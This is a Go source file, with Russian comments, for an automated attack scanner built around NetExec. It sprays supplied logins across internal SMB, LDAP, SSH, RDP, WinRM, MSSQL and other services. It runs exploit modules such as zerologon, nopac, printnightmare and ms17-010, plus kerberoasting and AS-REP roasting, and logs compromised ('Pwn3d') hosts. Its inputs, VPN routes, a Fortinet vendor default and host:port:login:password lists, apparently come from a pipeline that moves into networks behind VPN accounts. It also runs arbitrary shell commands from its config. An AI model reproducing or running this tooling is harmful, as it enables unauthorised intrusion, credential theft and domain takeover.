// cmd/nxc — NetExec scanner. Один бинарь, все протоколы.
// Парсеры вынесены в internal/nxcp — общие для SMB/LDAP/SSH/...
// Удалены легаси netexec_scaner.go, nxc_ldap.go, smb_info.go.
package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"runner/internal/cfg"
	"runner/internal/logx"
	"runner/internal/nxcp"
)

// ─── Config ───────────────────────────────────────────────────────────────

type scanCfg struct {
	Mode          string   `json:"mode"`
	Modules       []string `json:"modules"`
	CustomCommand string   `json:"custom_command"`
	Timeout       int      `json:"timeout_seconds"`
	Threads       int      `json:"threads"`
}

type credential struct{ Login, Password string }

// ─── JSON output ──────────────────────────────────────────────────────────

type scanResult struct {
	Metadata        scanMeta          `json:"metadata"`
	Targets         targetInfo        `json:"targets"`
	SMB             protoResult       `json:"smb"`
	LDAP            protoResult       `json:"ldap"`
	SSH             protoResult       `json:"ssh"`
	RDP             protoResult       `json:"rdp"`
	WinRM           protoResult       `json:"winrm"`
	MSSQL           protoResult       `json:"mssql"`
	FTP             protoResult       `json:"ftp"`
	VNC             protoResult       `json:"vnc"`
	WMI             protoResult       `json:"wmi"`
	Vulnerabilities []nxcp.VulnInfo   `json:"vulnerabilities"`
	PasswordPolicies []nxcp.PasswordPolicy `json:"password_policies,omitempty"`
	Summary         scanSummary       `json:"summary"`
}

type scanMeta struct {
	StartedAt, FinishedAt, Duration, Mode, Vendor, Group string
	Modules                                              []string `json:"modules"`
}

type targetInfo struct{ Routes, DNS []string }

type protoResult struct {
	Enabled  bool              `json:"enabled"`
	Targets  []string          `json:"targets"`
	Valid    []nxcp.ValidCred  `json:"valid_credentials"`
	Hosts    []nxcp.HostInfo   `json:"hosts"`
	IPs      []string          `json:"ips"`
	Domains  []string          `json:"domains"`
	Shares   []nxcp.ShareInfo  `json:"shares,omitempty"`
	RIDUsers []nxcp.RIDUser    `json:"rid_users,omitempty"`
	Pwn3d    []string          `json:"pwn3d,omitempty"`
}

type scanSummary struct {
	TotalHosts, TotalIPs, TotalDomains                    int
	ValidSMB, ValidLDAP, ValidSSH, ValidRDP, ValidWinRM   int
	ValidMSSQL, ValidFTP, ValidVNC, ValidWMI              int
	TotalShares, TotalUsers, TotalPwn3d, TotalVulns       int
	HasPwn3d                                              bool
}

// ─── Globals ──────────────────────────────────────────────────────────────

var (
	gCfg     = scanCfg{Timeout: 3600, Mode: "full", Modules: []string{"shares"}}
	nxcBin   = "nxc"
	gVulns   []nxcp.VulnInfo
	gPassPol []nxcp.PasswordPolicy
	gMu      sync.Mutex
	supportedFlagsCache = map[string]map[string]bool{}
	supportedFlagsMu    sync.Mutex
)

func addVuln(v nxcp.VulnInfo) {
	gMu.Lock()
	gVulns = append(gVulns, v)
	gMu.Unlock()
}

func addPassPol(p nxcp.PasswordPolicy) {
	gMu.Lock()
	gPassPol = append(gPassPol, p)
	gMu.Unlock()
}

// ─── NXC runner ───────────────────────────────────────────────────────────

func nxcTimeout() string {
	if os.Getenv("EXIT_PROXY") != "" {
		return "30"
	}
	return "10"
}

func detectNXC() bool {
	for _, b := range []string{"nxc", "netexec"} {
		if _, err := exec.LookPath(b); err == nil {
			nxcBin = b
			logx.Info("NXC binary: %s", b)
			// Предзаполняем кэш supported flags для всех протоколов
			for _, p := range []string{"smb", "ldap", "ssh", "rdp", "winrm", "mssql", "ftp", "vnc", "wmi"} {
				filterSupportedFlags(p, nil)
			}
			return true
		}
	}
	return false
}

func runNXC(proto, target, domain, user, pass string, extra []string) string {
	args := []string{proto, target, "-u", user, "-p", pass}
	if domain != "" {
		args = append(args, "-d", domain)
	}
	if gCfg.Threads > 0 {
		args = append(args, "--threads", fmt.Sprintf("%d", gCfg.Threads))
	}
	args = append(args, "--timeout", nxcTimeout())
	args = append(args, extra...)

	la := make([]string, len(args))
	copy(la, args)
	for i, a := range la {
		if a == pass && i > 0 && la[i-1] == "-p" {
			la[i] = "***"
		}
	}
	logx.Info("  [NXC] %s %s", nxcBin, strings.Join(la, " "))

	cmd := exec.Command(nxcBin, args...)
	sout, _ := cmd.StdoutPipe()
	serr, _ := cmd.StderrPipe()
	if err := cmd.Start(); err != nil {
		logx.Err("  [NXC] start: %v", err)
		return ""
	}

	var buf bytes.Buffer
	var wg sync.WaitGroup
	rd := func(r io.Reader) {
		defer wg.Done()
		sc := bufio.NewScanner(r)
		sc.Buffer(make([]byte, 0, 64*1024), 1024*1024)
		for sc.Scan() {
			l := sc.Text()
			buf.WriteString(l + "\n")
			fmt.Printf("    [NXC|%s] %s\n", proto, l)
		}
	}
	wg.Add(2)
	go rd(sout)
	go rd(serr)

	to := time.Duration(gCfg.Timeout) * time.Second
	if to <= 0 {
		to = 60 * time.Minute
	}
	for _, e := range extra {
		if e == "-M" {
			to *= 2
			break
		}
	}
	if to > 120*time.Minute {
		to = 120 * time.Minute
	}
	done := make(chan error, 1)
	go func() {
		wg.Wait()
		done <- cmd.Wait()
	}()
	select {
	case err := <-done:
		if err != nil {
			logx.Warn("  [NXC] exit: %v", err)
		}
	case <-time.After(to):
		cmd.Process.Kill()
		<-done
		logx.Warn("  [NXC] TIMEOUT %v", to)
	}
	return buf.String()
}

func isErr(o string) bool {
	for _, s := range []string{"usage: nxc", "error: argument", "error: unrecognized arguments", "Traceback (most recent", "nxc: error:"} {
		if strings.Contains(o, s) {
			return true
		}
	}
	return false
}

// ─── Flags filtering ──────────────────────────────────────────────────────

func filterSupportedFlags(proto string, flags []string) []string {
	supportedFlagsMu.Lock()
	cache, ok := supportedFlagsCache[proto]
	if !ok {
		cache = buildSupportedFlagsCache(proto)
		supportedFlagsCache[proto] = cache
	}
	supportedFlagsMu.Unlock()

	if len(cache) == 0 {
		return flags
	}
	if flags == nil {
		return nil
	}
	var out []string
	for _, f := range flags {
		if cache[f] {
			out = append(out, f)
		} else {
			logx.Info("  [NXC] flag %s not supported — skipping", f)
		}
	}
	return out
}

func buildSupportedFlagsCache(proto string) map[string]bool {
	cmd := exec.Command(nxcBin, proto, "--help")
	out, err := cmd.CombinedOutput()
	if err != nil && len(out) == 0 {
		return nil
	}
	cache := map[string]bool{}
	for _, line := range strings.Split(string(out), "\n") {
		for _, word := range strings.Fields(line) {
			word = strings.TrimRight(word, ",")
			if strings.HasPrefix(word, "--") || strings.HasPrefix(word, "-") {
				cache[word] = true
			}
		}
	}
	return cache
}

// ─── Helpers ──────────────────────────────────────────────────────────────

func cloneIP(ip net.IP) net.IP { c := make(net.IP, len(ip)); copy(c, ip); return c }
func incIP(ip net.IP) bool {
	for i := len(ip) - 1; i >= 0; i-- {
		ip[i]++
		if ip[i] != 0 {
			return true
		}
	}
	return false
}

func writeIPs(ips []string) string {
	if len(ips) == 0 {
		return ""
	}
	f, _ := os.CreateTemp("", "nxc_ips_*.txt")
	if f == nil {
		return ""
	}
	for _, ip := range ips {
		f.WriteString(ip + "\n")
	}
	f.Close()
	return f.Name()
}

func expandCIDRs(targets []string) (string, int, func()) {
	f, err := os.CreateTemp("", "nxc_combined_*.txt")
	if err != nil {
		return "", 0, func() {}
	}
	n := 0
	for _, t := range targets {
		if !strings.Contains(t, "/") {
			f.WriteString(t + "\n")
			n++
			continue
		}
		ip, ipN, err := net.ParseCIDR(t)
		if err != nil {
			continue
		}
		o, b := ipN.Mask.Size()
		if b-o > 16 {
			continue
		}
		c := cloneIP(ip.Mask(ipN.Mask))
		for ipN.Contains(c) {
			l := c[len(c)-1]
			if l != 0 && l != 255 {
				f.WriteString(c.String() + "\n")
				n++
			}
			if !incIP(c) {
				break
			}
		}
	}
	f.Close()
	return f.Name(), n, func() { os.Remove(f.Name()) }
}

// ─── Module maps ──────────────────────────────────────────────────────────

var smbFlags = map[string]string{"shares": "--shares", "users": "--users", "groups": "--groups", "rid": "--rid-brute", "rid_brute": "--rid-brute", "pass_pol": "--pass-pol", "loggedon": "--loggedon-users", "disks": "--disks"}
var smbMods = map[string]string{
	"spooler": "spooler", "coerce_plus": "coerce_plus", "zerologon": "zerologon", "nopac": "nopac", "smbghost": "smbghost",
	"printnightmare": "printnightmare", "gpp_autologin": "gpp_autologin", "gpp_password": "gpp_password",
	"laps": "laps", "webdav": "webdav", "enum_av": "enum_av", "enum_ca": "enum_ca",
	"ms17_010": "ms17-010", "ntlmv1": "ntlmv1", "spider_plus": "spider_plus", "ioxidresolver": "ioxidresolver",
	"petitpotam": "coerce_plus", "shadowcoerce": "coerce_plus", "dfscoerce": "coerce_plus",
}
var ldapFlags = map[string]string{"users": "--users", "groups": "--groups", "computers": "--computers", "pass_pol": "--pass-pol", "gmsa": "--gmsa"}
var ldapFFlags = map[string]string{"kerberoast": "--kerberoasting", "asreproast": "--asreproast"}
var ldapMods = map[string]string{
	"ldap_laps": "laps", "ldap_maq": "maq", "ldap_subnets": "subnets",
	"ldap_cert_templates": "adcs", "ldap_dns_records": "get-network",
	"ldap_desc_pass": "get-desc-users", "ldap_obsolete": "obsolete",
}
var sshFlags = map[string]string{}
var sshMods = map[string]string{"ssh_enum_users": "enum_users", "ssh_libssh": "libssh"}
var rdpFlags = map[string]string{"rdp_screenshot": "--screenshot", "rdp_nla": "--nla-screenshot"}
var rdpMods = map[string]string{"rdp_bluekeep": "rdp2", "rdp_ms12_020": "ms12-020", "rdp_nla": "nla"}
var winrmFlags = map[string]string{"winrm_exec": "--exec-method", "winrm_laps": "--laps"}
var winrmMods = map[string]string{}
var mssqlFlags = map[string]string{"mssql_query": "--query", "mssql_exec": "-x", "mssql_priv": "--priv"}
var mssqlMods = map[string]string{"mssql_enum": "mssql_priv", "mssql_accounts": "enum_logins"}
var ftpFlags = map[string]string{"ftp_ls": "--ls"}
var ftpMods = map[string]string{}
var vncFlags = map[string]string{"vnc_screenshot": "--screenshot"}
var vncMods = map[string]string{"vnc_auth": "vnc_auth"}
var wmiFlags = map[string]string{"wmi_exec": "--exec-method"}
var wmiMods = map[string]string{}
var okMods = map[string]bool{
	"coerce_plus": true, "enum_av": true, "enum_ca": true, "gpp_autologin": true, "gpp_password": true,
	"ioxidresolver": true, "laps": true, "ms17-010": true, "nopac": true, "ntlmv1": true,
	"printnightmare": true, "smbghost": true, "spider_plus": true, "spooler": true, "webdav": true, "zerologon": true,
	"adcs": true, "get-desc-users": true, "get-network": true, "maq": true, "obsolete": true, "subnets": true,
	"enum_users": true, "libssh": true, "rdp2": true, "ms12-020": true, "nla": true,
	"mssql_priv": true, "enum_logins": true, "vnc_auth": true,
}

func cFlags(mods []string, fm map[string]string) []string {
	s := map[string]bool{}
	var r []string
	for _, m := range mods {
		if f, ok := fm[m]; ok && !s[f] {
			s[f] = true
			r = append(r, f)
		}
	}
	return r
}
func cMods(mods []string, mm map[string]string) []string {
	s := map[string]bool{}
	var r []string
	for _, m := range mods {
		if n, ok := mm[m]; ok && !s[n] && okMods[n] {
			s[n] = true
			r = append(r, n)
		}
	}
	return r
}

// ─── Scanners ─────────────────────────────────────────────────────────────

func scanProto(proto string, targets []string, creds []credential, mods []string, domain string, flags, fmods map[string]string) protoResult {
	tag := strings.ToUpper(proto)
	res := protoResult{Enabled: true, Targets: targets}
	if len(targets) == 0 {
		res.Enabled = false
		return res
	}
	fl := cFlags(mods, flags)
	mm := cMods(mods, fmods)

	tf := writeIPs(targets)
	if tf != "" {
		defer os.Remove(tf)
	}
	tg := tf
	if tg == "" && len(targets) == 1 {
		tg = targets[0]
	}

	logx.Info("[%s] scan %d targets | flags: %v | mods: %v", tag, len(targets), fl, mm)

	for _, c := range creds {
		logx.Info("  [%s] cred: %s", tag, c.Login)
		out := runNXC(proto, tg, domain, c.Login, c.Password, fl)
		if isErr(out) {
			logx.Warn("  [%s] ✗ err", tag)
		}
		res.IPs = append(res.IPs, nxcp.ParseIPs(out, tag)...)
		res.Domains = append(res.Domains, nxcp.ParseDoms(out, tag)...)
		res.Hosts = append(res.Hosts, nxcp.ParseHosts(out, tag)...)
		res.Valid = append(res.Valid, nxcp.ParseValid(out, tag, c.Login, c.Password)...)
		for _, v := range nxcp.ParseVulns(out) {
			addVuln(v)
		}
		rawFile := proto + "_full_output.txt"
		if ex, err := os.ReadFile(rawFile); err == nil {
			os.WriteFile(rawFile, append(ex, []byte(out)...), 0644)
		} else {
			os.WriteFile(rawFile, []byte(out), 0644)
		}
	}
	res.IPs = cfg.Uniq(res.IPs)
	res.Domains = cfg.Uniq(res.Domains)

	if len(mm) > 0 && len(res.IPs) > 0 {
		logx.Info("[%s] Phase2: %d mods on %d hosts", tag, len(mm), len(res.IPs))
		mf := writeIPs(res.IPs)
		if mf != "" {
			defer os.Remove(mf)
		}
		mt := mf
		if mt == "" && len(res.IPs) == 1 {
			mt = res.IPs[0]
		}
		for _, c := range creds {
			for _, m := range mm {
				logx.Info("  [%s] -M %s", tag, m)
				out := runNXC(proto, mt, domain, c.Login, c.Password, []string{"-M", m})
				for _, v := range nxcp.ParseVulns(out) {
					addVuln(v)
				}
			}
		}
	}

	for _, v := range res.Valid {
		if v.Pwn3d {
			res.Pwn3d = append(res.Pwn3d, v.IP+"|"+v.Hostname)
		}
	}
	res.Pwn3d = cfg.Uniq(res.Pwn3d)

	var validLines []string
	for _, v := range res.Valid {
		l := fmt.Sprintf("%s|%s|%s|%s|%s|%s|%s", v.Protocol, v.IP, v.Port, v.Hostname, v.Domain, v.Login, v.Password)
		if v.Pwn3d {
			l += "|Pwn3d!"
		}
		validLines = append(validLines, l)
	}
	cfg.WriteLines(proto+"_valid.txt", validLines)
	cfg.WriteLines(proto+"_ips.txt", res.IPs)

	logx.OK("[%s] %d IP, %d valid, %d pwn3d", tag, len(res.IPs), len(res.Valid), len(res.Pwn3d))
	return res
}

func protoTargetsFromNmap(ports []string) []string {
	portSet := map[string]bool{}
	for _, p := range ports {
		portSet[p] = true
	}
	data, err := os.ReadFile("nmap_results.json")
	if err != nil {
		return nil
	}
	var nmap struct {
		Hosts []struct {
			IP     string `json:"ip"`
			Status string `json:"status"`
			Ports  []struct {
				Port  string `json:"port"`
				State string `json:"state"`
			} `json:"ports"`
		} `json:"hosts"`
	}
	if json.Unmarshal(data, &nmap) != nil {
		return nil
	}
	var ips []string
	seen := map[string]bool{}
	for _, h := range nmap.Hosts {
		if h.Status != "up" {
			continue
		}
		for _, p := range h.Ports {
			if p.State == "open" && portSet[p.Port] && !seen[h.IP] {
				seen[h.IP] = true
				ips = append(ips, h.IP)
			}
		}
	}
	return ips
}

func scanSMB(targets []string, creds []credential, mods []string) protoResult {
	res := protoResult{Enabled: true, Targets: targets}
	if len(targets) == 0 {
		res.Enabled = false
		return res
	}
	fl := cFlags(mods, smbFlags)
	mm := cMods(mods, smbMods)
	if len(fl) == 0 {
		fl = []string{"--shares"}
	}
	fl = filterSupportedFlags("smb", fl)
	fp, n, cl := expandCIDRs(targets)
	defer cl()
	logx.Info("[SMB] Phase1: %d hosts | flags: %v", n, fl)
	if n == 0 {
		return res
	}
	for _, c := range creds {
		logx.Info("  [SMB] cred: %s", c.Login)
		out := runNXC("smb", fp, "", c.Login, c.Password, fl)
		if isErr(out) {
			logx.Warn("  [SMB] ✗ err")
		}
		res.IPs = append(res.IPs, nxcp.ParseIPs(out, "SMB")...)
		res.Domains = append(res.Domains, nxcp.ParseDoms(out, "SMB")...)
		res.Hosts = append(res.Hosts, nxcp.ParseHosts(out, "SMB")...)
		res.Valid = append(res.Valid, nxcp.ParseValid(out, "SMB", c.Login, c.Password)...)
		res.Shares = append(res.Shares, nxcp.ParseShares(out)...)
		res.RIDUsers = append(res.RIDUsers, nxcp.ParseRIDUsers(out)...)
		if pp, ok := nxcp.ParsePasswordPolicy(out); ok {
			addPassPol(pp)
		}
	}
	res.IPs = cfg.Uniq(res.IPs)
	res.Domains = cfg.Uniq(res.Domains)

	if len(mm) > 0 && len(res.IPs) > 0 {
		logx.Info("[SMB] Phase2: %d mods on %d hosts", len(mm), len(res.IPs))
		tf := writeIPs(res.IPs)
		if tf != "" {
			defer os.Remove(tf)
		}
		tg := tf
		if tg == "" && len(res.IPs) == 1 {
			tg = res.IPs[0]
		}
		for _, c := range creds {
			for _, m := range mm {
				logx.Info("  [SMB] -M %s", m)
				out := runNXC("smb", tg, "", c.Login, c.Password, []string{"-M", m})
				for _, v := range nxcp.ParseVulns(out) {
					addVuln(v)
				}
			}
		}
	}
	for _, v := range res.Valid {
		if v.Pwn3d {
			res.Pwn3d = append(res.Pwn3d, v.IP+"|"+v.Hostname)
		}
	}
	res.Pwn3d = cfg.Uniq(res.Pwn3d)
	logx.OK("[SMB] %d IP, %d valid, %d shares, %d rid, %d pwn3d",
		len(res.IPs), len(res.Valid), len(res.Shares), len(res.RIDUsers), len(res.Pwn3d))
	return res
}

func scanLDAP(targets []string, creds []credential, mods []string, domain string) protoResult {
	res := protoResult{Enabled: true, Targets: targets}
	if len(targets) == 0 {
		res.Enabled = false
		return res
	}
	bf := cFlags(mods, ldapFlags)
	ff := map[string]string{}
	for _, m := range mods {
		if f, ok := ldapFFlags[m]; ok {
			ff[m] = f
		}
	}
	mm := cMods(mods, ldapMods)
	if len(bf) == 0 && len(ff) == 0 && len(mm) == 0 {
		bf = []string{"--users", "--groups"}
	}
	tf := writeIPs(targets)
	if tf != "" {
		defer os.Remove(tf)
	}
	tg := tf
	if tg == "" && len(targets) == 1 {
		tg = targets[0]
	}
	logx.Info("[LDAP] Phase1: probe %d targets | dom: %s", len(targets), domain)
	for _, c := range creds {
		logx.Info("  [LDAP] cred: %s", c.Login)
		if len(bf) > 0 {
			out := runNXC("ldap", tg, domain, c.Login, c.Password, bf)
			if isErr(out) {
				logx.Warn("  [LDAP] ✗ batch err")
			}
			res.IPs = append(res.IPs, nxcp.ParseIPs(out, "LDAP")...)
			res.Domains = append(res.Domains, nxcp.ParseDoms(out, "LDAP")...)
			res.Hosts = append(res.Hosts, nxcp.ParseHosts(out, "LDAP")...)
			res.Valid = append(res.Valid, nxcp.ParseValid(out, "LDAP", c.Login, c.Password)...)
			if pp, ok := nxcp.ParsePasswordPolicy(out); ok {
				addPassPol(pp)
			}
			if domain == "" {
				if d := nxcp.ParseDoms(out, "LDAP"); len(d) > 0 {
					domain = d[0]
				}
			}
		}
	}
	res.IPs = cfg.Uniq(res.IPs)
	res.Domains = cfg.Uniq(res.Domains)

	lm := map[string]bool{}
	for _, v := range res.Valid {
		lm[v.IP] = true
	}
	for _, h := range res.Hosts {
		lm[h.IP] = true
	}
	var lIPs []string
	for ip := range lm {
		lIPs = append(lIPs, ip)
	}
	if len(lIPs) == 0 {
		logx.Info("[LDAP] no responding hosts")
		return res
	}
	logx.Info("[LDAP] Phase2: mods on %d LDAP IPs", len(lIPs))
	lf := writeIPs(lIPs)
	if lf != "" {
		defer os.Remove(lf)
	}
	lt := lf
	if lt == "" && len(lIPs) == 1 {
		lt = lIPs[0]
	}
	for _, c := range creds {
		for mn, flag := range ff {
			of := fmt.Sprintf("/tmp/ldap_%s_%s.txt", mn, c.Login)
			logx.Info("  [LDAP] %s → %s", flag, of)
			out := runNXC("ldap", lt, domain, c.Login, c.Password, []string{flag, of})
			for _, v := range nxcp.ParseVulns(out) {
				addVuln(v)
			}
		}
		for _, m := range mm {
			logx.Info("  [LDAP] -M %s", m)
			out := runNXC("ldap", lt, domain, c.Login, c.Password, []string{"-M", m})
			for _, v := range nxcp.ParseVulns(out) {
				addVuln(v)
			}
		}
	}
	for _, v := range res.Valid {
		if v.Pwn3d {
			res.Pwn3d = append(res.Pwn3d, v.IP+"|"+v.Hostname)
		}
	}
	logx.OK("[LDAP] %d IP, %d dom, %d valid", len(lIPs), len(res.Domains), len(res.Valid))
	return res
}

func writeCompat(r scanResult) {
	cfg.WriteLines("smb_ips.txt", r.SMB.IPs)
	cfg.WriteLines("ldap_ips.txt", r.LDAP.IPs)
	cfg.WriteLines("smb_domains.txt", r.SMB.Domains)
	cfg.WriteLines("ldap_domains.txt", r.LDAP.Domains)
	var sv, lv []string
	for _, v := range r.SMB.Valid {
		l := fmt.Sprintf("%s|%s|%s|%s|%s|%s|%s", v.Protocol, v.IP, v.Port, v.Hostname, v.Domain, v.Login, v.Password)
		if v.Pwn3d {
			l += "|Pwn3d!"
		}
		if v.Guest {
			l += "|Guest"
		}
		sv = append(sv, l)
	}
	for _, v := range r.LDAP.Valid {
		l := fmt.Sprintf("%s|%s|%s|%s|%s|%s|%s", v.Protocol, v.IP, v.Port, v.Hostname, v.Domain, v.Login, v.Password)
		if v.Pwn3d {
			l += "|Pwn3d!"
		}
		lv = append(lv, l)
	}
	cfg.WriteLines("smb_valid.txt", sv)
	cfg.WriteLines("ldap_valid.txt", lv)

	var sh []string
	for _, s := range r.SMB.Shares {
		sh = append(sh, fmt.Sprintf("%s|%s|%s|%s|%s", s.IP, s.Hostname, s.ShareName, s.Permissions, s.Remark))
	}
	cfg.WriteLines("smb_shares.txt", sh)

	var smh, ldh []string
	for _, h := range r.SMB.Hosts {
		smh = append(smh, fmt.Sprintf("%s|%s|%s|%s|%s|%s|%s|%s", h.IP, h.Port, h.Hostname, h.Domain, h.OS, h.SMBv1, h.Signing, h.NullAuth))
	}
	for _, h := range r.LDAP.Hosts {
		ldh = append(ldh, fmt.Sprintf("%s|%s|%s|%s|%s|||", h.IP, h.Port, h.Hostname, h.Domain, h.OS))
	}
	cfg.WriteLines("smb_hosts.txt", smh)
	cfg.WriteLines("ldap_hosts.txt", ldh)
	os.WriteFile("smb_full_output.txt", []byte(""), 0644)
	os.WriteFile("ldap_full_output.txt", []byte(""), 0644)
}

// ─── main ─────────────────────────────────────────────────────────────────

func main() {
	start := time.Now()
	fmt.Println("═══ NXC Scanner v10.0 ═══")

	var creds []credential
	vendor, group := "fortinet", "default"
	if d, err := os.ReadFile("job_config.json"); err == nil {
		var jc struct {
			Credentials []struct{ Login, Password string } `json:"credentials"`
			Vendor, Group string
			Scan   scanCfg `json:"scan"`
		}
		if json.Unmarshal(d, &jc) == nil {
			for _, c := range jc.Credentials {
				creds = append(creds, credential{c.Login, c.Password})
			}
			if jc.Vendor != "" {
				vendor = jc.Vendor
			}
			if jc.Group != "" {
				group = jc.Group
			}
			if jc.Scan.Mode != "" {
				gCfg = jc.Scan
			}
		}
	}
	if len(creds) == 0 {
		for _, l := range cfg.ReadLines("input.txt") {
			p := strings.SplitN(l, ":", 4)
			if len(p) >= 4 {
				creds = append(creds, credential{p[2], p[3]})
			}
		}
	}
	if len(creds) == 0 {
		logx.Err("no creds")
		os.Exit(1)
	}
	if gCfg.Timeout <= 0 {
		gCfg.Timeout = 3600
	}
	if gCfg.Threads <= 0 {
		gCfg.Threads = 10
	}
	logx.Info("Mode:%s Mods:%v To:%ds Creds:%d", gCfg.Mode, gCfg.Modules, gCfg.Timeout, len(creds))

	if !detectNXC() {
		logx.Err("nxc not found")
		os.Exit(1)
	}

	routes := cfg.ReadLines("routes.txt")
	dns := cfg.ReadLines("dns.txt")
	vpnIP := ""
	if d, err := os.ReadFile("job_config.json"); err == nil {
		var t struct{ IP string `json:"ip"` }
		_ = json.Unmarshal(d, &t)
		vpnIP = t.IP
	}

	var ldT, smT []string
	for _, dc := range dns {
		h := strings.Split(dc, ":")[0]
		if h == vpnIP {
			continue
		}
		ldT = append(ldT, h)
	}
	for _, r := range routes {
		smT = append(smT, r)
	}
	if len(ldT) == 0 && len(routes) > 0 {
		if _, ipN, err := net.ParseCIDR(routes[0]); err == nil {
			if ip4 := ipN.IP.To4(); ip4 != nil {
				g := net.IP{ip4[0], ip4[1], ip4[2], ip4[3] + 1}
				if g.String() != vpnIP {
					ldT = []string{g.String()}
				}
			}
		}
	}

	dom := ""
	for _, f := range []string{"ldap_domains.txt", "smb_domains.txt"} {
		if ls := cfg.ReadLines(f); len(ls) > 0 {
			dom = ls[0]
			break
		}
	}

	r := scanResult{
		Metadata: scanMeta{
			StartedAt: start.Format(time.RFC3339),
			Mode:      gCfg.Mode, Modules: gCfg.Modules,
			Vendor: vendor, Group: group,
		},
		Targets: targetInfo{Routes: routes, DNS: dns},
	}

	scanExtra := func() {
		allIPs := cfg.Uniq(r.SMB.IPs, r.LDAP.IPs, smT)
		has := func(names ...string) bool {
			for _, m := range gCfg.Modules {
				for _, n := range names {
					if m == n {
						return true
					}
				}
			}
			return false
		}
		if has("ssh_scan", "ssh") {
			t := protoTargetsFromNmap([]string{"22"})
			if len(t) == 0 {
				t = allIPs
			}
			r.SSH = scanProto("ssh", t, creds, gCfg.Modules, dom, sshFlags, sshMods)
		}
		if has("rdp_scan", "rdp") {
			t := protoTargetsFromNmap([]string{"3389", "3388", "3390"})
			if len(t) == 0 {
				t = allIPs
			}
			r.RDP = scanProto("rdp", t, creds, gCfg.Modules, dom, rdpFlags, rdpMods)
		}
		if has("winrm_scan", "winrm") {
			t := protoTargetsFromNmap([]string{"5985", "5986"})
			if len(t) > 0 {
				r.WinRM = scanProto("winrm", t, creds, gCfg.Modules, dom, winrmFlags, winrmMods)
			}
		}
		if has("mssql_scan", "mssql") {
			t := protoTargetsFromNmap([]string{"1433", "1434"})
			if len(t) > 0 {
				r.MSSQL = scanProto("mssql", t, creds, gCfg.Modules, dom, mssqlFlags, mssqlMods)
			}
		}
		if has("ftp_scan", "ftp") {
			t := protoTargetsFromNmap([]string{"21"})
			if len(t) > 0 {
				r.FTP = scanProto("ftp", t, creds, gCfg.Modules, "", ftpFlags, ftpMods)
			}
		}
		if has("vnc_scan", "vnc") {
			t := protoTargetsFromNmap([]string{"5900", "5901", "5902"})
			if len(t) > 0 {
				r.VNC = scanProto("vnc", t, creds, gCfg.Modules, "", vncFlags, vncMods)
			}
		}
		if has("wmi_scan", "wmi") {
			t := protoTargetsFromNmap([]string{"135"})
			if len(t) > 0 {
				r.WMI = scanProto("wmi", t, creds, gCfg.Modules, dom, wmiFlags, wmiMods)
			}
		}
	}

	switch gCfg.Mode {
	case "full", "fresh":
		r.SMB = scanSMB(smT, creds, gCfg.Modules)
		lf := map[string]bool{}
		for _, t := range ldT {
			lf[t] = true
		}
		for _, ip := range r.SMB.IPs {
			lf[ip] = true
		}
		for _, v := range r.SMB.Valid {
			lf[v.IP] = true
		}
		var ll []string
		for ip := range lf {
			ll = append(ll, ip)
		}
		if dom == "" && len(r.SMB.Domains) > 0 {
			dom = r.SMB.Domains[0]
		}
		r.LDAP = scanLDAP(ll, creds, gCfg.Modules, dom)
		scanExtra()
	case "ldap_only":
		r.LDAP = scanLDAP(ldT, creds, gCfg.Modules, dom)
		r.SMB = protoResult{Enabled: false}
	case "smb_only":
		r.SMB = scanSMB(smT, creds, gCfg.Modules)
	case "ssh_only":
		r.SSH = scanProto("ssh", smT, creds, gCfg.Modules, dom, sshFlags, sshMods)
	case "rdp_only":
		r.RDP = scanProto("rdp", smT, creds, gCfg.Modules, dom, rdpFlags, rdpMods)
	case "mssql_only":
		r.MSSQL = scanProto("mssql", smT, creds, gCfg.Modules, dom, mssqlFlags, mssqlMods)
	case "winrm_only":
		r.WinRM = scanProto("winrm", smT, creds, gCfg.Modules, dom, winrmFlags, winrmMods)
	case "quick":
		qt := ldT
		if len(qt) > 1 {
			qt = qt[:1]
		}
		qs := smT
		if len(qs) > 1 {
			qs = qs[:1]
		}
		r.SMB = scanSMB(qs, creds, []string{"shares"})
		r.LDAP = scanLDAP(qt, creds, []string{"users"}, dom)
	case "custom":
		if gCfg.CustomCommand != "" {
			var b bytes.Buffer
			cmd := exec.Command("bash", "-c", gCfg.CustomCommand)
			cmd.Stdout = &b
			cmd.Stderr = &b
			err := cmd.Run()
			if err != nil {
				logx.Warn("custom cmd: %v", err)
			}
			fmt.Fprint(os.Stdout, b.String())
		}
	default:
		r.SMB = scanSMB(smT, creds, gCfg.Modules)
		r.LDAP = scanLDAP(ldT, creds, gCfg.Modules, dom)
	}

	r.Vulnerabilities = gVulns
	r.PasswordPolicies = gPassPol
	writeCompat(r)

	aIP := cfg.Uniq(r.LDAP.IPs, r.SMB.IPs, r.SSH.IPs, r.RDP.IPs, r.WinRM.IPs, r.MSSQL.IPs, r.FTP.IPs, r.VNC.IPs, r.WMI.IPs)
	aD := cfg.Uniq(r.LDAP.Domains, r.SMB.Domains)
	aP := append([]string{}, r.LDAP.Pwn3d...)
	aP = append(aP, r.SMB.Pwn3d...)
	aP = append(aP, r.SSH.Pwn3d...)
	aP = append(aP, r.WinRM.Pwn3d...)
	aP = append(aP, r.MSSQL.Pwn3d...)
	aP = append(aP, r.WMI.Pwn3d...)
	aP = cfg.Uniq(aP)

	r.Summary = scanSummary{
		TotalHosts: len(r.LDAP.Hosts) + len(r.SMB.Hosts) + len(r.SSH.Hosts) + len(r.RDP.Hosts) +
			len(r.WinRM.Hosts) + len(r.MSSQL.Hosts) + len(r.FTP.Hosts) + len(r.VNC.Hosts) + len(r.WMI.Hosts),
		TotalIPs:     len(aIP),
		TotalDomains: len(aD),
		ValidSMB:     len(r.SMB.Valid),
		ValidLDAP:    len(r.LDAP.Valid),
		ValidSSH:     len(r.SSH.Valid),
		ValidRDP:     len(r.RDP.Valid),
		ValidWinRM:   len(r.WinRM.Valid),
		ValidMSSQL:   len(r.MSSQL.Valid),
		ValidFTP:     len(r.FTP.Valid),
		ValidVNC:     len(r.VNC.Valid),
		ValidWMI:     len(r.WMI.Valid),
		TotalShares:  len(r.SMB.Shares),
		TotalUsers:   len(r.SMB.RIDUsers),
		TotalPwn3d:   len(aP),
		TotalVulns:   len(gVulns),
		HasPwn3d:     len(aP) > 0,
	}
	r.Metadata.FinishedAt = time.Now().Format(time.RFC3339)
	r.Metadata.Duration = time.Since(start).Round(time.Millisecond).String()
	j, _ := json.MarshalIndent(r, "", "  ")
	os.WriteFile("scan_result.json", j, 0644)

